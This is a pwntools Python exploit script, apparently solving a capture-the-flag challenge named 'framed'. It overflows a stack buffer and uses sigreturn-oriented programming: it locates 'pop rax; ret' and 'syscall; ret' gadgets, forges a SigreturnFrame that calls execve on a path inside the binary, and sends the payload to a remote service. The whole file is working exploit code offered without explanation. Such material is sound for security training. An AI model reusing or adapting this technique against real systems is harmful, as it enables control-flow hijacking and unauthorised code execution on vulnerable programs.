from pwn import ELF, process, ROP, remote, ssh, gdb, cyclic, cyclic_find, log, p64, u64, SigreturnFrame

LOCAL_BIN = "./framed"
LOCAL = False
GDB = False

BIN = ELF(LOCAL_BIN)

if LOCAL:
    P = process(LOCAL_BIN)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)
    if GDB:
        gdb.attach(P.pid, """
b *(_start+21)
display/i $pc
c
si
""")
else:
    P = remote('10.10.1.10',27307)
    ELF_LOADED = ELF(LOCAL_BIN)
    ROP_LOADED = ROP(ELF_LOADED)

# P.sendline(cyclic(20))

POP_RAX_RET = (ROP_LOADED.find_gadget(['pop rax', 'ret']))[0]
SYSCALL_RET = (ROP_LOADED.find_gadget(['syscall', 'ret']))[0]
BIN = 0x42440 # 0x42440 - 0x4245a  â†’   "/home/challenger/my_speech"
EXECVE = 59
SIGRETURN = 15

log.info("pop rax; ret gadget: " + hex(POP_RAX_RET))
log.info("syscall; ret gadget: " + hex(SYSCALL_RET))
log.info("binary to call: " + hex(BIN))
 
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = EXECVE
frame.rdi = BIN
frame.rsi = 0
frame.rdx = 0
frame.rsp = 0xffffffff
frame.rip = SYSCALL_RET

rip_offset = cyclic_find(0x61616164)

payload = b"\x90" * rip_offset + p64(POP_RAX_RET)
payload += p64(SIGRETURN)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

P.sendline(payload)
log.success(P.clean())